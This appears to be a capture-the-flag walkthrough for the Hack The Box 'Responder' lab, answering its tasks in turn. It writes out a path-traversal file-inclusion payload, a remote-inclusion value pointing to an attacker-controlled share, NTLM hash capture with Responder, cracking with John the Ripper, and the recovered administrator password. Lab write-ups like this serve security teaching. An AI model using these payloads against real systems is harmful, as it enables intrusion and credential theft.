# Responder
<img width="400" height="400" alt="image" src="https://github.com/user-attachments/assets/e6c50f1e-e626-4652-840c-248fb5f128fb" />

---
### Task 1
When visiting the web service using the IP address, what is the domain that we are being redirected to?

Ans : unika.htb

<img width="400" height="400" alt="image" src="https://github.com/user-attachments/assets/9bb48b97-b199-4c65-bd36-7c5aa462a4d2" />

---
### Task 2
Which scripting language is being used on the server to generate webpages?

Ans : PHP

<img width="952" height="182" alt="image" src="https://github.com/user-attachments/assets/83a260be-5983-40af-ad4a-689f55eecc70" />

---
```
before moving to the next task, you need to add the ip address with its domain name to the "\etc\host\".
```
### Task 3
What is the name of the URL parameter which is used to load different language versions of the webpage?

Ans : page

<img width="856" height="526" alt="image" src="https://github.com/user-attachments/assets/6133afe3-7da3-4636-9b14-76c611c9558e" />

---
### Task 4
Which of the following values for the page parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "mimikatz.exe"

Ans : ../../../../../../../../windows/system32/drivers/etc/hosts

<img width="762" height="237" alt="image" src="https://github.com/user-attachments/assets/355ec178-b8bf-4c88-9448-60baf05a5ef2" />


---
### Task 5
Which of the following values for the page parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "./../../../../../../../windows/system32/drivers/etc/hosts", "mimikatz.exe"

Ans : //10.10.14.6/somefile

<img width="762" height="237" alt="image" src="https://github.com/user-attachments/assets/505c2624-90ed-4ff7-8202-bade579b4a50" />

---
### Task 6
What does NTLM stand for?

Ans : New Technology Lan Manager

---
### Task 7
Which flag do we use in the Responder utility to specify the network interface?

Ans : -I

<img width="736" height="511" alt="image" src="https://github.com/user-attachments/assets/eeea8532-64d6-4c55-9bc9-51b0921381e8" />

---
### Task 8
There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as john, but the full name is what?.

Ans : John The Ripper

---
### Task 9
What is the password for the administrator user?

Ans : badminton

<img width="766" height="182" alt="image" src="https://github.com/user-attachments/assets/7b77f248-cfff-47b4-8658-2cc3f884a8f6" />

The responder captured the hashvalue, which later was creacked by John the Ripper, as shown below :

<img width="762" height="156" alt="image" src="https://github.com/user-attachments/assets/c4092549-1a22-4108-ab41-1b1bda0369e8" />

---
### Task 10
We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?

Ans : 5985

<img width="512" height="135" alt="image" src="https://github.com/user-attachments/assets/ecafceee-f9e6-4610-9713-a2515fa9750f" />

---
### Task 11
On which user's desktop is the flag located?

Ans : mike

To login : 

<img width="767" height="282" alt="image" src="https://github.com/user-attachments/assets/464c56c3-3298-4db6-9e9e-5090f64ee31d" />

Flag location :

<img width="522" height="662" alt="image" src="https://github.com/user-attachments/assets/3326e57b-2b70-4329-8dcf-6541904b26bc" />

---
### Submit Single Flag
Submit the flag located on the mike user's desktop.

<img width="442" height="67" alt="image" src="https://github.com/user-attachments/assets/d3b8de2f-5181-42ea-aed6-48a60f1c650e" />


---

<img width="516" height="332" alt="image" src="https://github.com/user-attachments/assets/1c45881c-0c6c-43d8-9aab-9b7e4225015f" />


---
## Thank You 

